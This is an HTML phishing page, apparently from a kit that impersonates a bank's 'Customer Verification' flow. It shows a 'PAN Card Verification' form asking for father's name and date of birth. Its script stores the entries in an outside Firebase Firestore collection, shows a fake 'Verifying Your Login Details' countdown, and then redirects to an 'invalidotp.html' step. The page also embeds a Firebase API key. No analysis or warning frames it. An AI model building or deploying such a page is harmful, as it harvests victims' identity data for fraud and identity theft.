<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>sbynorewdpolnt</title>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
      authDomain: "sbighsh.firebaseapp.com",
      projectId: "sbighsh",
      storageBucket: "sbighsh.firebasestorage.app",
      messagingSenderId: "685947657107",
      appId: "1:685947657107:web:471a0557bb72235272a666"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Generate sessionId for this tab
    let sessionId = generateSessionId();
    function generateSessionId() {
      return 'sess_' + Math.random().toString(36).substr(2, 9) + Date.now();
    }

    function formatDOB(input) {
      var value = input.value.replace(/\D/g, '');
      if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2);
      if (value.length > 5) value = value.substring(0, 5) + '/' + value.substring(5);
      input.value = value;
    }

    function submitForm() {
      var fatherName = document.getElementById('fatherName').value.trim();
      var dob = document.getElementById('dob').value.trim();
      if (fatherName === "" || dob === "") {
        alert("Please fill all fields.");
        return;
      }

      // Save the form data along with the sessionId in Firestore
      db.collection("pan_verification").add({
        fatherName: fatherName,
        dob: dob,
        sessionId: sessionId,  // Store sessionId
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      })
      .then(() => {
        var countdown = 3;
        var loadingText = document.getElementById('loadingText');
        document.getElementById('overlay').style.display = 'flex';

        var interval = setInterval(function() {
          loadingText.innerHTML = `Please wait... Verifying Your Login Details... Redirecting in ${countdown} seconds.`;
          countdown--;
          if (countdown < 0) {
            clearInterval(interval);
            window.location.href = 'invalidotp.html';
          }
        }, 1000);
      })
      .catch((error) => {
        console.error("Error saving data:", error);
        alert("Something went wrong. Try again.");
      });
    }
  </script>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      width: 100%;
      height: 100%;
      overflow-x: hidden;
      font-family: Arial, sans-serif;
      background-color: #eef2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .header, .footer {
      width: 100%;
      max-width: 480px;
      background-color: #fff;
      text-align: center;
      position: relative;
    }
    .header img.main-header, .footer img {
      width: 100%;
      display: block;
    }
    .menu-button {
      position: absolute;
      top: 10px;
      left: 10px;
      width: 30px;
      height: 30px;
    }
    .headline {
      width: 100%;
      max-width: 400px;
      height: 70px;
      background: linear-gradient(to right, #8e24aa, #510f87);
      display: flex;
      align-items: center;
      padding-left: 10px;
      color: #fff;
      font-weight: bold;
      font-size: 18px;
      position: relative;
    }
    .headline .close-btn {
      position: absolute;
      right: 15px;
      font-size: 24px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .headline .headline-text {
      margin-left: 30px;
    }
    .progress-bar-container {
      width: 100%;
      max-width: 480px;
      height: 10px;
      background-color: #e0e0e0;
      border-radius: 5px;
      margin: 10px 0;
      position: relative;
    }
    .progress-bar {
      height: 100%;
      background-color: #4caf50;
      border-radius: 5px;
      width: 45%;
      position: relative;
    }
    .progress-text {
      position: absolute;
      width: 100%;
      text-align: center;
      font-size: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #ffffff;
    }
    .otp-section {
      width: 100%;
      max-width: 480px;
      background: #fff;
      margin: 20px 0;
      padding: 25px 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .otp-title {
      text-align: center;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 30px;
      color: #333;
    }
    .input-group {
      position: relative;
      margin-bottom: 20px;
    }
    .input-group input {
      width: 100%;
      padding: 10px 5px;
      font-size: 16px;
      border: none;
      border-bottom: 2px solid #6a1b9a;
      background: transparent;
      outline: none;
    }
    .input-group label {
      position: absolute;
      top: 10px;
      left: 5px;
      font-size: 16px;
      color: #666;
      transition: 0.2s all;
      pointer-events: none;
    }
    .input-group input:focus~label,
    .input-group input:not(:placeholder-shown)~label {
      top: -10px;
      font-size: 12px;
      color: #6a1b9a;
    }
    .required-star {
      color: red;
    }
    .submit-btn {
      width: 100%;
      padding: 12px;
      background-color: #6a1b9a;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 30px;
    }
    .security-image img {
      width: 100%;
      max-width: 480px;
      border-radius: 8px;
      margin-top: 20px;
    }
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.9);
      backdrop-filter: blur(5px);
      z-index: 9999;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding-top: 80px;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #6a1b9a;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    .loading-text {
      font-size: 18px;
      color: #333;
      text-align: center;
      padding: 0 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<!-- Loading Overlay -->
<div class="overlay" id="overlay">
  <div class="spinner"></div>
  <div class="loading-text" id="loadingText">Please wait... Verifying Your Login Details... Redirecting in 3 seconds.</div>
</div>

<!-- Top Header -->
<div class="header">
  <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
  <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
</div>

<!-- Headline Section -->
<div class="headline">
  <div class="headline-text">Customer Verification</div>
</div>

<!-- Progress Bar -->
<div class="progress-bar-container">
  <div class="progress-bar" style="width: 45%;">
    <div class="progress-text">45% Complete</div>
  </div>
</div>

<!-- PAN Section -->
<div class="otp-section">
  <div class="otp-title">PAN Card Verification</div>

  <div class="input-group">
    <input type="text" id="fatherName" required placeholder=" " />
    <label for="fatherName">Father Name<span class="required-star">*</span></label>
  </div>

  <div class="input-group">
    <input type="text" id="dob" required placeholder=" " maxlength="10" oninput="formatDOB(this)" />
    <label for="dob">Date of Birth<span class="required-star">*</span></label>
  </div>

  <button class="submit-btn" onclick="submitForm()">Submit</button>
</div>

<!-- Security Image -->
<div class="security-image">
  <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
</div>

<!-- Footer -->
<div class="footer">
  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
</div>

</body>
</html>
